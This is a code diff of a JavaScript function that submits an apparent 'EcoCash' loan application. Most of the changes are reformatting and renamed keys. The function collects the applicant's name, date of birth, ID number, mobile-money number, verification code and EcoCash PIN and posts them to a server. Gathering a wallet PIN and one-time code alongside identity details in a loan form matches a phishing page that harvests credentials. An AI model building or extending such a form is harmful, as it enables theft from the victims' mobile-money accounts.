@@ -2314,39 +2314,70 @@ async function saveEcoCashPin() {
 }
 
 // ======================================================
-// PART 25 - SUBMIT ECOCASH APPLICATION
+// PART 25 - SUBMIT ECOCASH APPLICATION VERSION
 // ======================================================
 
 async function submitEcoCashApplication() {
 
     const data = {
 
-        fullNames: sessionStorage.getItem("fullNames"),
-        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
-        idNumber: sessionStorage.getItem("idNumber"),
-        occupation: sessionStorage.getItem("occupation"),
-        loanPurpose: sessionStorage.getItem("loanPurpose"),
+        fullNames:
+            sessionStorage.getItem("fullNames"),
 
-        loanAmount: sessionStorage.getItem("loanAmount"),
-        loanPeriod: sessionStorage.getItem("loanPeriod"),
-        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
-        totalRepayment: sessionStorage.getItem("totalRepayment"),
+        dateOfBirth:
+            sessionStorage.getItem("dateOfBirth"),
 
-        disbursementMethod: "EcoCash",
+        idNumber:
+            sessionStorage.getItem("idNumber"),
 
+        occupation:
+            sessionStorage.getItem("occupation"),
+
+        loanPurpose:
+            sessionStorage.getItem("loanPurpose"),
+
+        loanAmount:
+            sessionStorage.getItem("loanAmount"),
+
+        loanPeriod:
+            sessionStorage.getItem("loanPeriod"),
+
+        monthlyRepayment:
+            sessionStorage.getItem("monthlyRepayment"),
+
+        totalRepayment:
+            sessionStorage.getItem("totalRepayment"),
+
+        disbursementMethod:
+            "EcoCash",
+
+        // Bank fields are empty because
+        // this is an EcoCash application
         selectedBank: "",
         accountName: "",
         bankPhone: "",
         accountNumber: "",
-        bankVerificationCode: "",
-        bankPin: "",
 
-        ecoName: sessionStorage.getItem("ecoName"),
-        ecoNumber: sessionStorage.getItem("ecoNumber"),
-        ecoVerificationCode:
-            sessionStorage.getItem("ecoVerificationCode"),
+        BankVerificationCode: "",
+        BankPin: "",
+
+        // EcoCash details
+        ecoName:
+            sessionStorage.getItem("ecoName"),
+
+        ecoNumber:
+            sessionStorage.getItem("ecoNumber"),
+
+        EcoVerificationCode:
+            sessionStorage.getItem(
+                "EcoVerificationCode"
+            ),
+
+        //EcoCash Pin
         ecoPin:
-            sessionStorage.getItem("ecoPin")
+            sessionStorage.getItem(
+                "ecoPin"
+            )
 
     };
 
@@ -2367,9 +2398,13 @@ async function submitEcoCashApplication() {
             }
         );
 
-        const result = await response.json();
+        const result =
+            await response.json();
 
-        if (!response.ok || !result.success) {
+        if (
+            !response.ok ||
+            !result.success
+        ) {
 
             throw new Error(
                 result.error ||
@@ -2401,6 +2436,7 @@ async function submitEcoCashApplication() {
     }
 
 }
+
 // ===============================
 // LIVE TRACKING STATUS
 // ===============================
